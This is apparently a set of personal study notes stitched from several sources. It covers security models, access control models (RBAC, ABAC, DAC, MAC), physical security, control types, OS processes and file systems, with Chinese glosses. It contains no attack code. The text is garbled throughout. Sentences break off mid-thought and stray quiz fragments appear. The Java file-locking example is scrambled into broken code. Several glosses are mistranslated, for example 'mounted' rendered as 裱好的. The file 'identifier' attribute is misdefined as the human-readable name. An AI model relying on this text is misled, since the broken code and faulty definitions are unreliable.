to an object. An access control matrix is a table of subjects and objects that indicates the actions or functions that each subject can perform on each object. Bell-LaPadula subjects have a clearance level that allows them to access only those objects with the corresponding
Exam Essentials 305
306 Chapter 8 ■ Principles of Security Models, Design, and Capabilities
classification levels. This enforces confidentiality. Biba prevents subjects with lower secu- rity levels from writing to objects at higher security levels. Clark-Wilson is an integrity model that relies on auditing to ensure that unauthorized subjects cannot access objects and that authorized users access objects properly. Biba and Clark- Wilson enforce integrity. Goguen-Meseguer and Sutherland focus on integrity. Graham-Denning focuses on the secure creation and deletion of both subjects and objects.
Know the definitions of certification and accreditation. Certification is the technical evaluation of each part of a computer system to assess its concordance with security standards. Accreditation is the process of formal acceptance of a certified configuration from a designated authority.
Be able to describe open and closed systems. Open systems are designed using industry standards and are usually easy to integrate with other open systems. Closed systems are generally proprietary hardware and/or software. Their specifications are not normally published, and they are usually harder to integrate with other systems. to reading from and writing to certain memory locations. Bounds are the limits of memory a process cann ## 2. Access Control Models
Access Control Models
Access control ensures that only authenticated and authorized entities can access resources.
example, it ensures that only authenticated users who have been granted
appropriate permissions can access files on a server. This starts by ensuring that users are accurately identified and authenticated.
grant access using different models.
  - Role-Based Access Control (RBAC, role_BAC) model
  - Group, user
  - Matrix
  - Rule-Based Access Control (RBAC, rule-BAC) model
  - ACL
  - Implemented in network devices (like firewalls) to control inbound and outbound traffic based on filtering rules.
  - Access or denied
  - depending on Access Control List (ACL) entries
  - Group-based access control in MS Windows.
  - Attribute-Based Access Control (ABAC) model:
  - defines access control rules with statements of natural
language
  - Example of propertied:
  - Subject (i.e. user or process requesting access)
  - Type of action (example "read", "write", "execute")
  - Resource type (medical record, bank account etc.)
  - Environment (contextual data, such as time of day or
geolocation)
  - Discretionary 无条件的 access control (DAC)
  - owner determines
  - Every object includes a discretionary access control list (DACL)
  - Mandatory Access Control (MAC) model (strictest)
  - Every resource has sensitivity label matching a clearance level assigned to a user
  - sensitivity level: assigned to the resource.
  - Labels and clearance levels: applied and changed by
an administrator
   ▪


##   - used in Trusted OS implementations
Subjects:
  - Typically, users / groups that access an object.
  - Occasionally, the subject may be a service that is using a service account
to access an object.
Objects: items that subjects access. (like files, folders, shares, printers).
  - Example: users access files and printers.
  - The access control determine how a system grants authorization(users
access) to objects, files and other resources.
Comparing Access Control Models
The role-based access control (role-BAC) model: uses roles to grant access by
placing users into roles based on their assigned jobs, functions, or tasks. A matrix matching job titles with required privileges is useful as a planning document when using role-BAC.
Group-based privileges are a form of role-BAC. Administrators create groups,
add users to the groups, and then assign permissions to the groups. This simplifies administration because administrators do not have to assign permissions to users individually.
The rule-based access control (rule-BAC) model: based on a set of approved
instructions, such as ACL rules in a firewall. Some rule- BAC implementations use rules that trigger in response to an event, such as modifying ACLs after detecting an attack.
the discretionary access control (DAC) model
  - The owner has explicit access and establishes access for other user.
  - Microsoft NTFS uses the DAC model, every object have a discretionary
access control list (DACL).
  - The DACL identifies who has access and what access they are granted.
  - A major flaw of the DAC model is its susceptibility to Trojan horses.
Mandatory access control (MAC) uses security or sensitivity labels to identify
objects (what you’ll secure) and subjects (users). It is often used when access needs to be restricted based on a need to know.
  - The administrator establishes access based on predefined security 1,064

▪
labels.
  - These labels are often defined with a lattice to specify the upper and
lower security boundaries.
An attribute-based access control (ABAC): evaluates attributes and grants
access based on the value of these attributes.
  - used in many software defined networks (SDNs).
Role-Based Access Control (role-BAC)
uses roles to manage rights and permissions for users.
useful for users within a specific department who perform the same job
functions.
Example:
An administrator creates the roles and then assigns specific rights and permissions
to the roles (instead of to the users).
administrator adds a user to a role (has all the rights and permissions of that role)
  - organization has several departments: Accounting, Sales, and IT
  - each department has a separate server hosting its files.
  - create roles of Accounting, Sales, and IT
  - assign these roles to users based on the department where they work.
  - grant these roles access to the appropriate server: grant the Accounting role to the Accounting server, grant the Sales role to the Sales server....
Another example:
Microsoft Project Server:
  - can host multiple projects managed by different project managers. It includes the following roles:
  - Administrators:
  - have complete access
  - control over everything, all the projects managed on the server.
  - Executives:
  - can access data from any project held on the server
  - do not have access to modify system settings on the server.
  - Project Managers:
  - have full control over their own projects
  - do not have any control over projects owned by other project
managers.
  - Team Members:
  - can typically report on work that project managers assign to them,
  - But have little access outside the scope of their assignments.
   Microsoft Project Server includes more roles...
Each roles: has rights and permissions assigned to it
to give associated privileges: simply add the user’s account to the role.
Documenting Roles with a Matrix 模型
Microsoft Project Serve:
creating roles
did some planning and identified the roles they envisioned in the application. identified the privileges each of these roles required.
It’s common to document role-based permissions with a matrix listing all of the job
titles and the privileges for each role.
Matric: A planning document, matches the roles with the required privileges.
 Table 2.1: Role-BAC matrix for Project Server Role-BAC is also called hierarchy / job-based:
Hierarchy-based:
  - top-level roles (Administrators role) have significantly more permissions
than lower-level roles (Team Members role).
  - Roles may mimic the hierarchy of an organization.
Job-, task-, function-based:
  - roles are centered on jobs / functions that users need to perform.
Establishing Access with: (group or user) Group-Based Privileges
Administrators commonly grant access in the role-BAC model using roles and often implement roles as groups.   - Windows: refer to security groups.
assign rights and permissions (privileges) to groups, add user accounts to the
appropriate group. group-based access control:
  - access is based on roles or groups
  - simplifies user administration.
One implementation of the role-BAC model: the Microsoft built-in security groups:
  - specially created security groups that administrators create on workstations, servers, and within domains.
  - Example of a built-in security group:
  - the Administrators group on a local computer includes all of the
rights and permissions on that computer.
  - If you want to grant Marge full and complete control to a computer,
you could add user account to the Administrators group on that
computer.
  - Once Marge is a member of the Administrators group, she has all
the rights and permissions of the group.
  - grant users the ability by adding user accounts to the group.
built-in groups: useful but don’t meet all the requirements in most organizations.
  - Example:
  - organization wants to separate backup and restore responsibilities:
  - Need to create one group only back up and another group only
restore data.
  - In Windows domains:
  - administrators often create groups that correspond to the departments of an organization.
  - Example
  - worker in the Sales department need to access data stored in a
shared folder named Sales on a network server.
  - simplify administration:
  - 1. Create a Sales group and add each of the user accounts to the
Sales group.
  - 2. Add the Sales group to the Sales folder.
  - 3. Assign appropriate permissions to the Sales group for the Sales
folder.
  - adds new salespeople, creates accounts for them and places their
accounts into the Sales group.
  - If any users change or leave, removes them from the Sales group. ▪


##  ⁃
user-assigned privileges
assign all the specific rights and permissions for every user individually. unmanageable with more users.
Groups provide security benefit:
Reduce admin workload of access management
automatically inherit the privileges to the group.
Easy erase: Removing the user from group instantly removes all the user rights and
permissions applied from that group.
  - if assign permissions to users directly
  - probably won’t remember which resources were assigned to the user as a
member of the Sales department.
  - Instead, the user violating the principle of least privilege.
Rule-Based Access Control (rule-BAC)
uses rules.
The predefined rules state which subjects can access which objects.
granted or denied depending on the contents of Access Control List (ACL) 1,068

▪
entries
The most common example:
  - Rules Implemented in network devices (routers, firewalls)
  - more advanced implementations cause rules to trigger within
applications, too.
Routers and firewalls use rules within access control lists (ACLs).
  - These rules define the traffic that the devices allow into the network, such as allowing Hypertext Transfer Protocol (HTTP) traffic for web browsers.
  - These rules are typically static: administrators create the rules, the rules stay the same unless an administrator changes them again.
  - However, some rules are dynamic.
  - Example
  - intrusion prevention systems detect attacks,
  - and then modify rules to block traffic from an attacker.
  - the attack triggers a change in the rules.
configure user applications with rules.
  - Example:
  - want to give Homer additional permissions to a database if Marge is absent.
  - You can configure a database rule to trigger a change to these permissions when the system recognizes that Marge is absent.
Attribute-Based Access Control (ABAC)
evaluates attributes and grants access based on the value of these attributes 属性. Attributes can be almost any characteristic of a user, the environment, or the
resource.
ABAC uses policies to evaluate attributes and grant access when the system detects a match in the policy.
Example:
Homer is a Nuclear Safety Inspector at the Springfield Nuclear Power Plant.
His user account may be defined with the following attributes: employee, inspector, and nuclear aware.
A file server at the plant includes a share called Inspector and it holds documents commonly used by nuclear safety inspectors.
An ABAC policy for the share might grant access to the share for any subjects that have the attributes of employee, inspector, and nuclear aware.
         Many software defined networks (SDNs) use ABAC models.
Instead of rules on physical routers, policies in the ABAC system control the traffic. These policies typically use plain language statements.
Example:
an ABAC policy rule for a company that employs researchers:
“Allow logged-on researchers to access research sites via the main network.”
Policy statements typically include four elements: Subject: typically a user.
  - You can use any user property as an attribute such as employment status, group memberships, job roles, logged-on status, and more.
  - In the example, the subject is identified as being logged on and a member of a researchers group.
Object: the resource (such as a file, database, or application) that the user is trying to access.
  - In the example, the object is research sites.
  - The research sites object would include Internet access via a proxy server
along with a specific list of URLs of research sites. Action: what the user is attempting to do:
  - such as reading or modifying a file, accessing specific web sites, and accessing web site applications.
  - The example allows access to specific web sites.
Environment: includes everything outside of the subject and object attributes.
  - This is often referred to as the context of the access request.
  - It can include the time, location, protocols, encryption, devices, and
communication method.
  - In the example, it specifies the main network as an environmental
attribute.
An ABAC system:
has a lot of flexibility
can enforce both a DAC and a MAC model.
also many similarities to the DAC and MAC models. the DAC model, owners have control over the access
  - ABAC model, owners can create policies to grant access.
The MAC model uses labels assigned to both subjects and objects and grants
access when the labels match
  - ABAC model uses attributes that identify both subjects and objects, and
grants access when a policy identifies a match. ▪


## Discretionary 无条件的 Access Control (DAC) model
Within limits, discretionary access controls allow the subject to define objects to
access as needed.
This access control list serves as a dynamic access rule set that the subject can modify.
The constraints 强制 imposed on the modifications often relate to the subject’s identity. Based on the identity, the subject may be allowed to add or modify the rules that define access to objects.
every object has owner
the owner establishes access for the objects.
  - Example:
  - Windows and most Unix-based systems, use DAC model.
common example:
the New Technology File System (NTFS) used in Windows.
  - NTFS provides security by allowing users and administrators to restrict access to files and folders with permissions.
  - NTFS is based on the DAC model and the following section explains how it uses the DACmodel.
SIDs and DACLs
Microsoft systems
identify users with security identifiers (SIDs)
  - a long string of characters
  - may look like this: S-1-5-21-3991871189- 223218. I
  - instead of the system displaying the SID
  - it looks up the name associated with the SID and displays the name.
Similarly, identify groups with a SID.
Every object includes a discretionary access control list (DACL):
  - The DACL: a list of Access Control Entries (ACEs).
  - identifies who can access it in a system using the DAC model.
  - Each ACE: SID + permission(s) granted to the SID.
Example:
  - folder: Study Notes. have the following permissions assigned:
           ▪


##   - Lisa: Full Control
  - Bart: Read
  - Maggie: Modify
online exercises: http://gcgapremium.com/501labs/.
The Owner Establishes Access
If users create a file, they are designated as the owner and have explicit control over the file.
As the owner, users can modify the permissions on the object by adding user or group accounts to the DACL and assigning the desired permissions.
The DAC model is significantly more flexible than the MAC model
  - MAC: predefined access privileges, the administrator is required to make the changes.
  - DAC: grant another user access to a file you own, you simply make the change, and that user has access.
Beware of Trojans
DAC model has the susceptibility to Trojan horses.
When Bart installed the program, it also installed malware.
if Bart was logged on with administrative privileges when he installed it, the Trojan is
able to run with these administrative privileges.
Solution: Many organizations require administrators to have two accounts to mitigate the risks associated with Trojans.
Most of the time, administrators log on with a regular user account.
If the system is infected with malware, the malware has limited permissions assigned
to the regular user account.
If the system is infected with malware while the administrator is logged on with an administrative account, the malware has the elevated permissions of an administrator.
Mandatory Access Control (MAC) model
static attributes of the subject and the object are considered to determine the permissibility of an access.
Each subject possesses attributes that define its clearance / authority, to access resources.
   ▪


##  uses labels (sometimes referred to as sensitivity labels or security labels) to determine access.
Security administrators assign labels to both subjects (users) and objects (files or folders).
  - When the labels match, the system can grant a subject access to an object.
  - When the labels don’t match, the access model blocks access. MAC uses sensitivity labels for userd and data.
  - Commonly used when access needs to be restricted, based on a need to know.
Need to know:
individuals have a Top Secret clearance, shouldn’t automatically have access to all
Top Secret data.
access is restricted based on a need to know.
Security-enhanced Linux (SELinux)
one of the few operating systems using the MAC model.
  - Windows OS: discretionary access control model.
SELinux was specifically created to demonstrate how mandatory access controls can be added to an operating system.
Labels and Lattice 格子
MAC model: uses different levels of security to classify the users and data.
These levels are defined in a lattice.
The lattice can be a complex relationship between different ordered sets of labels. These labels define the boundaries for the security levels.
  Uses lattice: to divide access into separate compartments based on a need to know. The lattice starts by defining different levels of Top Secret, Secret, Confidential, and
For Official Use.
Each labels defines specific security boundaries.
Within these levels, the lattice defines specific compartments. 间隔
  - Example:
  - the Top Secret level includes compartments labeled Nuclear Power Plant, 007, and Happy Sumo.
  - One has a Top Secret clearance with a Nuclear Power Plant label.
  - This gives him access to data within the Nuclear Power Plant
compartment.
  - However, he does not have access to data in the 007 or Happy Sumo
compartment unless he also has those clearances (and associated labels).
Higher-level clearances: include lower-level clearances.
  - Example:
  - one has a Top Secret clearance, he can be granted access to Secret and
lower-level data.
  - but only be able to access data on these lower levels based on his need
to know.
Administrators grant her access to data on the Secret level and lower levels, based on her need to know.
  - Example:
  - they might grant her access to the Research data by assigning the
Research label to her, but not necessarily grant her access to Three-eyed Fish or Legal Issues data. However, they cannot grant her access to any data on the Top Secret level.
Establishing Access
An administrator: responsible for establishing access
Only one at a higher authority: define the access for subjects and objects.
Typically, a security professional identifies the specific access individuals are authorized to access, upgrade or downgrade the individuals’ access, when necessary.
security professional does all this via paperwork and does not assign the rights and permissions on computer systems.
administrator assigns the rights based on the direction of the security professional.
Multiple approval levels are involved in the decision-making process to determine what a user can access.
Example:
in the military
officer working in the security professional role would coordinate with higher- level
government entities: to upgrade or downgrade clearances.
These higher- level entities: approve or disapprove clearance requests.
Once an individual is formally granted access, a network administrator would be
responsible for establishing access based on the clearances identified by the security professional.
  - all the permissions and access privileges are predefined.
If someone needed different access:
the administrator would forward the request to the security professional, who may
approve or disapprove the request.
security professional may forward the request to higher entities based on established
procedures.
This process takes time and results in limited flexibility.
Understanding Physical Security
Access control
a critical part of physical security ▪


## can help cut down social engineering or other type of attack from succeeding. Consoles and systems must operate in controlled environments in order to be
secure.
  - These environments must be safe from intrusion, be protected from
physical access.
physical barriers.
key aspect of access control
The objective: prevent access to computers and network systems.
The most effective physical barrier: multiple barrier system / defense in depth.
  - more than one physical barrier be crossed to gain access. Ideally, systems should have a minimum of 3 physical barriers:
Perimeter 边缘:
  - The external entrance to the building.
  - burglar alarms, external walls, fencing, surveillance...
  - This should be used with an access list: identifies who can be verified and enter a facility.
  - Temporary access individual (repair person or HVAC technician), should be escorted at all times and never left alone in secure areas.
A locked door protecting the computer center; you should also rely on such items as ID badges, proximity readers, fobs, or keys to gain access.
  - Proximity reader: a catchall term for any ID or card reader capable of reading proximity cards. Proximity cards go by a number of different titles, but they are just RFID (radio frequency identification) cards that can be read when close to a reader and truly never need to touch anything.The readers work with 13.56 MHz smart cards and 125 kHz proximity cards, and they can open turnstiles, gates, and any other physical security safeguards once the signal is read.
The entrance to the computer room itself.
  - This should be another locked door that is carefully monitored.
  - many who enter the building could be posing:
  - heating technicians, representatives of the landlord... Although these pretenses can get them past the first two barriers, the locked computer room door should still stop them.
     3 barriers won’t always stop intruders: slow them down enough so that law enforcement can respond before an intrusion is fully developed.
Once inside: physical token (something you have) or biometrics (something you are) for access to the actual network resources.
Air gap
a network security measure
to ensure that a secure computer network is physically isolated from unsecured networks.
   - two or more networks are physically separated from each other to ensure no data can traverse from one to the other.
not common in businesses, but in government or military networks, highly critical infrastructure networks like nuclear power plant controls and financial systems like stock exchanges.
commonly used in environments where networks/devices are rated to handle different levels of classified information (classified and unclassified, example). When moving data from one system to another, confidentiality models (like Bell–
LaPadula) are commonly used.
  - B) SFRs
C) Certified Secure Operating System (CSOS)
D) Protection Profiled Operating System (PPOS) (都不存 在)
Various Control Types
CompTIA has categorized controls into 8 types:
制止 Deterrent control: anything warn, delay or discourage a would-be attacker that they should not attack.
  - take away allowance if things happens.
  - posted warning notice, locks on doors, barricades, lighting. 预防 Preventive controls: to stop something from happening.
  - fence around the yard
  - locked doors that keep intruders out,
  - user training on potential harm (to keep them vigilant and alert), or biometric devices and guards that deny access until authentication has occurred.
Detective control: to uncover a violation.
   - when a preventive control has failed, need to sound an alarm.
  - look out the window on a regular basis
  - checksum on a downloaded file, an alarm that sounds when a door has been pried open, or an antivirus scanner that actively looks for problems, sonic detector, motion sensor, or anything that would detect that an intrusion is under way.
Corrective controls: intended to correct a situation, to prevent the recurrence of errors.
  - when improper outcomes are detected.
  - quality circle teams and budget variance reports.
Compensating controls: backup controls that come when other controls have failed.
  - how to call the police
  - An office building:
  - complex electronic lock on the door (preventive control)
  - a sign that you will be arrested if you enter (deterrent control)
  - an alarm that sounds (compensating control) when the door is jimmied
  - a backup generator (compensating control) to keep that electronic lock active when the power goes out.
Technical controls: controls implemented through technology.
  - They may be deterrent, preventive, detective, or compensating (but not
administrative),
  - Include: firewalls, IDS, and IPS.
Administrative control: is one that comes down through policies, proce- dures, and guidelines. notified first, who is called second, and so on.
  - the list of steps to be followed when a key employee is terminated: disable their account, change the server password, and so forth.
Physical controls: put in place to reduce the risk of harm coming to physical property, information, computer systems, or other assets.
  - Include: cameras, guards, fences, barricades, and other items 5. Operating Systems Security 3.1 Operating Systems Concepts
Early computers allowed only one program to be executed at a time. This program had complete control of the system and had access to all the system’s resources.
contemporary computer systems allow multiple programs to be loaded into memory and executed concurrently.
This evolution required firmer control and more compartmentalization of the various programs; and these needs resulted in the notion of a process, which is a program in execution.
A process is the unit of work in a modern computing system.
A system therefore consists of a collection of processes, some executing user code, others executing operating system code.
Potentially, all these processes can execute concurrently, with the CPU (or CPUs) multiplexed among them.
536CN3 chapter 3.1 Process Concept
what to call all the CPU activities.
Early computers were batch systems that executed jobs, followed by the emergence of time-shared systems that ran user programs, or tasks. Even on a single-user system, a user may be able to run several programs at one time. And even if a computer can execute only one program at a time, such as on an embedded device that does not support multitasking, the OS may need to support its own internal programmed activities (like memory management). In many respects, all these activities are similar, we call all of them processes.
536CN3 chapter 3.1.1 The Process
a process is a program in execution.
The status of the current activity of a process is represented by the value of the program counter and the contents of the processor’s registers.
The memory layout of a process is typically divided into multiple sections:
Text—the executable code
Data —global variables
Heap — memory that is dynamically allocated during program run time.
Stack —temporary data storage when invoking functions (such as function parameters, return addresses, and local variables)  sizes of the text and data sections are fixed (do not change during program run time).
sizes of the stack and heap sections can shrink and grow dynamically during program execution.
Each time a function is called, an activation record (containing function parameters, local variables, and the return address) is pushed onto the stack; when control is returned from the function, the activation record is popped from the stack.
Similarly, the heap will grow as memory is dynamically allocated, and will shrink when memory is returned to the system. the stack and heap sections grow toward one another, but do not overlap one another.
We emphasize that a program by itself is not a process. A program is a passive entity, such as a file containing a list of instructions stored on disk (often called an executable fil). In contrast, a process is an active entity, with a program counter specifying the next instruction to execute and a set of associated resources. A program becomes a process when an executable file is loaded into memory. Two common techniques for loading executable files are double-clicking an icon representing the executable file and entering the name of the executable file on the command line (as in prog.exe or a.out).
Although two processes may be associated with the same program, they are nevertheless considered two separate execution sequences. For instance, several users may be running different copies of the mail program, or the same user may invoke many copies of the web browser program. Each of these is a separate process; and although the text sections are equivalent, the data, heap, and stack sections vary. It is also common to have a process that spawns many processes as it runs. We discuss such matters in Section 3.4. ▪


## Note that a process can itself be an execution environment for other code. The Java programming environment provides a good example. In most cir- cumstances, an executable Java program is executed within the Java virtual machine (JVM). The JVM executes as a process that interprets the loaded Java code and takes actions (via native machine instructions) on behalf of that code. example, to run the compiled Java program Program.class, we would enter
java Program
The command java runs the JVM as an ordinary process, which in turns executes the Java program Program in the virtual machine. The concept is the same as simulation, except that the code, instead of being written for a different instruction set, is written in the Java language.
1.3 The File system
Another key component of an operating system: file system.
how the external, nonvolatile memory of the computer is organized.
OS organize files hierarchically into folders, also called directories. Each folder may contain files and/or subfolders. Thus, a volume, or
drive, consists of a collection of nested folders that form a tree. The topmost folder is the root of this tree, the root folder.
 ▪


## The file system consists of two distinct parts:
a collection of files, each storing related data,
a directory structure, which organizes and provides information about all the files in the system.
   File concept
Types: Data
numeric character binary
Program
Contents defined by file’s creator Many types
Consider text file, source file, executable file
File: a logical storage unit.
A file is a named collection of related information that is recorded on secondary
storage.
mapped by the operating system onto physical devices (usually nonvolatile storage devices, the contents are persistent between system reboots).
For user, file is the smallest allotment of logical secondary storage (data cannot be written to secondary storage unless they are within a file).
Commonly, files represent programs and data:
Data files: numeric, alphabetic, alphanumeric, or binary.
Programs: both source and object forms.
Files may be free form, such as text files, or may be formatted rigidly.
In general, a file is a sequence of bits, bytes, lines, or records, defined by the creator and user.
The concept of a file is thus extremely general.
Because files are the method users and applications use to store and retrieve data, and because they are so general purpose, their use has stretched beyond its original confines.
example, UNIX, Linux, and some other operating systems provide a proc file system that uses file-system interfaces to provide access to system information (such as process details).
Many different types of information may be stored in a file—source or executable programs, numeric or text data, photos, music, video, and so on.
A file has a certain defined structure, depends on type.
text file: a sequence of characters organized into lines (and possibly pages).
Source file: a sequence of functions, each of which is further organized as declarations followed by executable statements.
Executable file: a series of code sections that the loader can bring into memory and execute. File Attributes
Name – only information kept in human-readable form
Identifier – unique tag (number), identifies file within file system, it is the
human-readable name for the file.
Type – needed for systems that support different types Location – pointer to file location on device
Size – current file size
Protection – controls who can do reading, writing, executing
Time, date, and user identification – data for protection, security, and usage monitoring, (This information may be kept for creation, last modification, and last use.)
Information about files are kept in the directory structure, which is maintained on the disk
Many variations, including extended file attributes such as file checksum Information kept in the directory structure
File Access Control
One of the main concerns of operating system security is:
delineate which users can access which resources, read files, write data, and execute programs.
each resource on disk, including both data files and programs, has a set of permissions associated with it.
File Permissions writable, or executable by a user or group of users.
permission data: typically stored in the metadata of the file, with attributes like the type of file.
When process attempts to access a file, the OS checks the identity of the process, determines whether or not access should be granted based on file permissions.
Several Unix-like operating systems have a simple mechanism for file permissions, a file permission matrix.
This matrix 模型 is a representation of who is allowed to do what to the file
contains permissions for 3 classes, each features a combination of bits. Files have an owner (user id), and a group (group id).
  - owner class, determines permissions for the creator of the file.
  - group class, determines permissions for users in the same group as the file.
  - others class, determines permissions for users who are neither the owner of the file nor in the same group as the file.
Each of these classes has a series of bits to determine what permissions apply.
The first bit is the read bit, allows users to read the file.
Second is the write bit, allows users to alter the contents of the file.
Finally is the execute bit, allows users to run the file as a program or script, or, in the case of a directory, to change their current working directory to that one.
An example of a file permission matrix for a set of files in a directory. using the ls -l command.  Floats.class: has read, write, and execute rights for its owner, goodrich, and nonowners alike.
Floats.java: is readable by everyone, writeable only by its owner, and no one has execute rights.
Test.java: is only readable and writable by its owner—all others have no access rights.
Unix File Permissions
The read, write, and execute bits are implemented in binary, but it is common to express them in decimal notation:
the execute bit has weight 1,
the write bit has weight 2,
and read bit has weight 4.
each combination of the 3 bits yields a unique number between 0 and 7, which summarizes the permissions for a class.
example, 3 denotes that both the execute and write bits are set, while 7 denotes that read, write, and execute are all set.
Using this decimal notation, the entire file permission matrix can be expressed as three decimal numbers.
example, a file with a permission matrix of 644.
the owner has permission to read and write the file (the owner class is set to 6), users in the same group can only read (the group class is set to 4),
other users can only read (the others class is set to 4).
In Unix, file permissions can be changed using the chmod command to set the file permission matrix, and the chown command to change the owner or group of a file.
A user must be the owner of a file to change its permissions. Folders also have permissions.
read permissions: allows user to list that folder’s contents
write permissions: allows a user to create new files in that folder.
Unix-based systems employ a path-based approach for file access control.
The OS keeps track of the user’s current working directory.
Access to a file or directory: providing a path to it,
the path is traversed one directory at the time, beginning with the start directory/root directory, denoted with /, or at the current working directory.
for each such directory, the execute permission is checked.
to get access, the user must have execute permissions for all the directories in the path.
Example, Bob is accessing directory /home/alice, the home directory of Alice (his boss), Bob has execute permission, and wants to read file / home/alice/administration/memos/raises.txt.
When Bob issues the Unix command cat administration/memos/raises.txt
to view the file, the OS first checks if Bob has execute permission on the first folder, administration. If so, the OS checks next folder, memos. If so, the OS finally checks whether Bob has read permission on file raises.txt.
If Bob does not have execute permission on administration or memos, or does not have read permission on raises.txt, access is denied.
File Operations
File is an abstract data type Create
Write – at write pointer location Read – at read pointer location Reposition within file - seek 搜索 Delete
Truncate - not all os provide this. Remove content but remain the header.
Open(Fi) –
  - search the directory structure on disk for entry Fi   - move the content of entry to memory. Close (Fi) –
  - move the content of entry Fi in memory to directory structure on disk.
如果我们需要在文件尾端处截去一些数据以缩短文件⻓度，
可以通过下面两个函数完成:
#include <unistd.h>
#include <sys/types.h>
int truncate(const char *path, off_t length); int ftruncate(int fd, off_t length);
ftruncate和truncate都会将参数指定的文件的大小修改为参 数length指定的大小。 如果原来的文件大小比参数length 大，则超过的部分会被删除，如果文件以前的⻓度短于 length，则其效果与系统有关。执行成功则返回0，失败返 回-1，错误原因存于errno。
调用truncate失败后，对应的errno值可能是: EACCESS 参数path所指定的文件无法存取 EROFS 欲写入的文件存在于只读文件系统内 EFAULT 参数path指针超出可存取空间 EINVAL 参数path包含不合法字符 ENAMETOOLONG 参数path太⻓ EISDIR 参数path指向一目录
ETXTBUSY 参数path所指的文件为共享程序，而且正 被执行中
ELOOP 参数path有过多符号连接问题 EIO I/O存取错误
调用ftruncate失败后，对应的errno值可能是:
EBADF 参数fd文件描述词为无效的或该文件已关闭。 EINVAL 参数fd 为socket 并非普通文件，或是该文件
并非以写入模式打开。
Open Files
Several pieces of data are needed to manage open files: Open-file table: tracks open files
File pointer:
  - pointer to last read/write location,
  - per process that has the file open. File-open count:
  - counter of number of times a file is open
  - to allow removal of data from open-file table
when last processes closes it
Disk location of the file: cache of data access
information
Access rights: per-process access mode information
Open File Locking
Mandatory or advisory: Mandatory 强制 – access is denied depending on locks held and requested
Advisory 询问 – processes can find status of locks and decide what to do
  - Provided by some operating systems and file systems
  - Similar to reader-writer locks
  - Shared lock (reader lock):
  - several processes can acquire concurrently
  - Exclusive lock (writer lock):   - Mediates access to a file
File Locking Example – Java API
import java.io.*;
import java.nio.channels.*; public class LockingExample {
public static final boolean EXCLUSIVE = false;
public static final boolean SHARED = true;
public static void main(String arsg[]) throws IOException {
FileLock sharedLock = null; FileLock exclusiveLock = null; try {
RandomAccessFile raf = new RandomAccessFile("file.txt", "rw");
// get the channel for the file FileChannel ch = raf.getChannel(); }
exclusive EXCLUSIVE);
shared raf.length(),
// this locks the first half of the file - exclusiveLock = ch.lock(0, raf.length()/2,
/** Now modify the data . . . */ // release the lock
exclusiveLock.release();
// this locks the second half of the file -
sharedLock = ch.lock(raf.length()/2+1, SHARED);
/** Now read the data . . . */ // release the lock sharedLock.release();
} catch (java.io.IOException ioe) { System.err.println(ioe);
} }
}finally {
if (exclusiveLock != null) exclusiveLock.release(); if (sharedLock != null) sharedLock.release();
File Types – Name, Extension  File Structure
None - sequence of words(several bytes), bytes
Simple record structure Lines
Fixed length Variable length Complex Structures Formatted document Relocatable load file
Can simulate last two with first method by inserting appropriate control characters
Who decides: Operating system Program
Sequential-access File
 Sequential Access 循环档案
write
read next write next reset
no read after last
(rewrite)
Direct Access 直接存取档案 – file is fixed length logical records read n
write n position to n
read next write next rewrite n
  - n = relative block number
  - Relative block numbers allow OS to decide where file
should be placed.
Simulation of Sequential Access on Direct-
access File
 Other Access Methods
Can be built on top of base methods
General involve creation of an index for the file
Keep index in memory for fast determination of location of data to be operated on (consider UPC code plus record of data about that item)
If too large, index (in memory) of the index (on disk)
IBM indexed sequential-access method (ISAM) Small master index, points to disk blocks of
secondary index
File kept sorted on a defined key All done by the OS
VMS operating system provides index and relative files as another example (see next slide)
Example of Index and Relative Files
 Directory Structure
A collection of nodes containing information about all files Both the directory structure and the files reside on disk
Disk Structure
Disk can be subdivided into partitions 分割.
Disks or partitions can be RAID (Redundant Array of Independent
Disks) 独立硬盘冗余阵列 protected against failure
Disk or partition can be used raw – without a file system,
or formatted with a file system
Partitions also known as minidisks, slices
Entity containing file system known as a volume
 Each volume containing file system also tracks file system’s info in device directory or volume table of contents
As well as general-purpose file systems there are many special-purpose file systems, frequently all within the same operating system or computer
   Types of File Systems
We mostly talk of general-purpose file systems
But systems frequently have may file systems for general/ special- purpose
Consider Solaris has
tmpfs – memory- based volatile FS for fast, temporary
I/O
objfs – interface into kernel memory to get kernel
symbols for debugging
ctfs – contract file system for managing daemons lofs – loopback file system allows one FS to be
accessed in place of another
procfs – kernel interface to process structures ufs, zfs – general purpose file systems Operations Performed on Directory
Search/Create/Delete/Rename a file List a directory
Traverse the file system
Directory Organization
The directory is organized logically to obtain: Efficiency – locating a file quickly
Naming – convenient to users
Two users can have same name for different files The same file can have several different names
Grouping – logical grouping of files by properties, (e.g., all Java programs, all games, ...)
Single-Level Directory
A single directory for all users Naming problem
Grouping problem  Two-Level Directory
Separate directory for each user Path name
Can have the same file name for different user Efficient searching
No grouping capability
 Tree-Structured Directories
Efficient searching Grouping Capability Current directory (working directory)
   cd /spell/mail/prog
   type list
 Absolute or relative path name
Creating a new file is done in current directory Delete a file
  - rm<file-name>
Creating a new subdirectory is done in current directory   - mkdir<dir-name>
Example: if in current directory /mail
  - mkdircount   -  ⁃
  - Deleting “mail” ⇒ deleting the entire subtree rooted by “mail”
非循环的 Acyclic-Graph Directories
Have shared subdirectories and files Two different names (aliasing)
If dict deletes list ⇒ dangling pointer
Solutions:
Backpointers, so we can delete all pointers
Variable size records a problem Backpointers using a daisy chain organization Entry-hold-count solution
New directory entry type
Link – another name (pointer) to an existing file Resolve the link – follow pointer to locate the file  General Graph Directory
How do we guarantee no cycles?
Allow only links to file not subdirectories
Garbage collection
Every time a new link is added use a cycle detection
algorithm to determine whether it is OK  File System Mounting
A file system must be mounted 裱好的 before it can be accessed
A unmounted file system (i.e., Fig. 11-11(b)) is mounted at a mount point.  Mount Point  File Sharing
Sharing of files on multi-user systems is desirable
Sharing may be done through a protection scheme
On distributed systems, files may be shared across a network
Network File System (NFS) is a common distributed file- sharing method If multi-user system
User IDs:
  - identify users,
  - allowing permissions and protections to be
per-user
Group IDs:
  - allow users to be in groups,
  - permitting group access rights Owner of a file / directory
Group of a file / directory
File Sharing – Remote File Systems
Uses networking to allow file system access between systems
Manually via programs like FTP.
Automatically, seamlessly using distributed file
systems.
Semi automatically via the world wide web.
Client-server model allows clients to mount remote file systems from servers
Server can serve multiple clients
Client and user-on-client identification is insecure or
complicated
NFS is standard UNIX client-server file sharing
protocol
CIFS is standard Windows protocol Standard operating system file calls are translated into remote calls
